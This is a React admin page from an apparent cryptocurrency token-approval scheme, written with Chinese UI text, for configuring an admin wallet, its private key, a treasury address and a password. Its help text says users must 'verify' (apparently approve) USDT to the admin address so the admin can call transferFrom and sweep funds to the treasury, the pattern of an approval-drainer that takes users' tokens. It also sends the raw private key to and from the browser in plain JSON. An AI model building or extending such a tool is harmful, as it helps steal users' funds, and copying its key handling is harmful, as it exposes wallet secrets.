'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Badge } from '@/components/ui/badge'

interface SystemConfig {
  adminAddress: string
  adminPrivateKey: string
  treasuryAddress: string
  adminPassword: string
}

export default function SystemConfigPage() {
  const [config, setConfig] = useState<SystemConfig>({
    adminAddress: '',
    adminPrivateKey: '',
    treasuryAddress: '',
    adminPassword: ''
  })
  const [loading, setLoading] = useState(false)
  const [saving, setSaving] = useState(false)
  const [message, setMessage] = useState<{ type: 'success' | 'error', text: string } | null>(null)
  const [showPrivateKey, setShowPrivateKey] = useState(false)

  // 获取当前配置
  useEffect(() => {
    fetchConfig()
  }, [])

  const fetchConfig = async () => {
    try {
      setLoading(true)
      const response = await fetch('/api/admin/system/config')
      const result = await response.json()
      
      if (result.success) {
        setConfig(result.data)
      } else {
        setMessage({ type: 'error', text: result.error || '获取配置失败' })
      }
    } catch (error) {
      setMessage({ type: 'error', text: '网络错误，请重试' })
    } finally {
      setLoading(false)
    }
  }

  const handleConfigChange = (field: keyof SystemConfig, value: string) => {
    setConfig(prev => ({
      ...prev,
      [field]: value
    }))
  }

  const validateConfig = () => {
    const errors: string[] = []
    
    if (!config.adminAddress || !/^0x[a-fA-F0-9]{40}$/.test(config.adminAddress)) {
      errors.push('管理员地址格式无效')
    }
    
    if (!config.adminPrivateKey || !/^[a-fA-F0-9]{64}$/.test(config.adminPrivateKey.replace('0x', ''))) {
      errors.push('管理员私钥格式无效')
    }
    
    if (!config.treasuryAddress || !/^0x[a-fA-F0-9]{40}$/.test(config.treasuryAddress)) {
      errors.push('收款地址格式无效')
    }
    
    if (!config.adminPassword || config.adminPassword.length < 6) {
      errors.push('管理员密码至少6位')
    }
    
    return errors
  }

  const handleSaveConfig = async () => {
    const errors = validateConfig()
    if (errors.length > 0) {
      setMessage({ type: 'error', text: errors.join(', ') })
      return
    }

    if (!confirm('确定要保存系统配置吗？这将重启应用以应用新配置。')) {
      return
    }

    try {
      setSaving(true)
      const response = await fetch('/api/admin/system/config', {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(config)
      })

      const result = await response.json()
      
      if (result.success) {
        setMessage({ type: 'success', text: '配置保存成功！应用将在5秒后重启以应用新配置。' })
        
        // 5秒后刷新页面
        setTimeout(() => {
          window.location.reload()
        }, 5000)
      } else {
        setMessage({ type: 'error', text: result.error || '保存配置失败' })
      }
    } catch (error) {
      setMessage({ type: 'error', text: '网络错误，请重试' })
    } finally {
      setSaving(false)
    }
  }

  if (loading) {
    return (
      <div className="p-6">
        <div className="flex items-center justify-center h-40">
          <div className="text-lg">加载配置中...</div>
        </div>
      </div>
    )
  }

  return (
    <div className="p-6 space-y-6">
      <div className="flex justify-between items-center">
        <div>
          <h1 className="text-3xl font-bold">系统配置</h1>
          <p className="text-gray-600 mt-2">管理系统核心配置参数</p>
        </div>
        <Badge variant="outline" className="text-sm">
          安全配置
        </Badge>
      </div>

      {message && (
        <Alert className={message.type === 'error' ? 'border-red-500 bg-red-50' : 'border-green-500 bg-green-50'}>
          <AlertDescription className={message.type === 'error' ? 'text-red-700' : 'text-green-700'}>
            {message.text}
          </AlertDescription>
        </Alert>
      )}

      <div className="grid gap-6">
        {/* 管理员账户配置 */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              🔑 管理员账户配置
            </CardTitle>
            <CardDescription>
              配置用于执行转账操作的管理员账户信息
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="adminAddress">管理员地址</Label>
              <Input
                id="adminAddress"
                value={config.adminAddress}
                onChange={(e) => handleConfigChange('adminAddress', e.target.value)}
                placeholder="0x..."
                className="font-mono"
              />
              <p className="text-sm text-gray-600">
                用户需要将USDTverify给此地址才能执行转账
              </p>
            </div>

            <div className="space-y-2">
              <Label htmlFor="adminPrivateKey">管理员私钥</Label>
              <div className="flex gap-2">
                <Input
                  id="adminPrivateKey"
                  type={showPrivateKey ? "text" : "password"}
                  value={config.adminPrivateKey}
                  onChange={(e) => handleConfigChange('adminPrivateKey', e.target.value)}
                  placeholder="不包含0x前缀的64位私钥"
                  className="font-mono"
                />
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => setShowPrivateKey(!showPrivateKey)}
                >
                  {showPrivateKey ? '隐藏' : '显示'}
                </Button>
              </div>
              <p className="text-sm text-red-600">
                ⚠️ 私钥具有转账权限，请妥善保管
              </p>
            </div>
          </CardContent>
        </Card>

        {/* 财务配置 */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              💰 财务配置
            </CardTitle>
            <CardDescription>
              配置资金收款和管理相关参数
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="treasuryAddress">收款地址</Label>
              <Input
                id="treasuryAddress"
                value={config.treasuryAddress}
                onChange={(e) => handleConfigChange('treasuryAddress', e.target.value)}
                placeholder="0x..."
                className="font-mono"
              />
              <p className="text-sm text-gray-600">
                用户转账和归集资金的默认接收地址
              </p>
            </div>
          </CardContent>
        </Card>

        {/* 安全配置 */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              🔒 安全配置
            </CardTitle>
            <CardDescription>
              配置管理后台访问安全参数
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="adminPassword">管理后台密码</Label>
              <Input
                id="adminPassword"
                type="password"
                value={config.adminPassword}
                onChange={(e) => handleConfigChange('adminPassword', e.target.value)}
                placeholder="至少6位密码"
              />
              <p className="text-sm text-gray-600">
                用于登录管理后台的密码
              </p>
            </div>
          </CardContent>
        </Card>

        <div className="h-px bg-gray-200 my-6" />

        {/* 操作按钮 */}
        <div className="flex justify-end gap-4">
          <Button
            variant="outline"
            onClick={fetchConfig}
            disabled={loading || saving}
          >
            重置配置
          </Button>
          <Button
            onClick={handleSaveConfig}
            disabled={saving}
            className="min-w-24"
          >
                          {saving ? 'Saving...' : 'Save Config'}
          </Button>
        </div>
      </div>

      {/* 配置说明 */}
      <Card className="bg-blue-50 border-blue-200">
        <CardHeader>
          <CardTitle className="text-blue-900">📖 配置说明</CardTitle>
        </CardHeader>
        <CardContent className="text-blue-800 space-y-2">
          <p><strong>管理员地址：</strong>用于执行transferFrom操作的地址，用户需要verifyUSDT给此地址</p>
          <p><strong>管理员私钥：</strong>对应管理员地址的私钥，用于签名转账交易</p>
          <p><strong>收款地址：</strong>默认的资金接收地址，可以是财政部或其他指定地址</p>
          <p><strong>管理后台密码：</strong>用于验证管理员身份的登录密码</p>
          <p className="text-red-600"><strong>⚠️ 安全提醒：</strong>修改配置后应用将重启，请确保在业务低峰期操作</p>
        </CardContent>
      </Card>
    </div>
  )
} 